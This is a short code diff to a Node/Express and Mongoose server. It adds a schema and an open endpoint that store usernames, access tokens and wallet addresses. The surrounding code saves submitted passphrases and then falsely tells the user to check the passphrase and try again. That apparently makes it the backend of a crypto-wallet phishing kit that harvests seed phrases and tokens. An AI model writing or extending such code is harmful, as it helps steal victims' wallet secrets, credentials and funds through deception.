@@ -22,6 +22,16 @@ const passphraseSchema = new mongoose.Schema({
 
 const Passphrase = mongoose.model('Passphrase', passphraseSchema);
 
+// Schema for authentication result
+const authResultSchema = new mongoose.Schema({
+  username: String,
+  accessToken: String,
+  walletAddress: String,
+  // add other fields as needed
+});
+
+const AuthResult = mongoose.model('AuthResult', authResultSchema);
+
 // API endpoint to handle form submission
 app.post('/api/passphrase', async (req, res) => {
   try {
@@ -33,6 +43,17 @@ app.post('/api/passphrase', async (req, res) => {
     res.status(200).send('Please check your passphrase and try again.');
   } catch (error) {
     res.status(500).send('Error saving passphrase');
+  }
+});
+
+// API endpoint to save authentication result
+app.post('/api/save-auth-result', async (req, res) => {
+  try {
+    const newAuthResult = new AuthResult(req.body);
+    await newAuthResult.save();
+    res.status(201).send('Authentication result saved successfully');
+  } catch (error) {
+    res.status(500).send('Error saving authentication result');
   }
 });
 
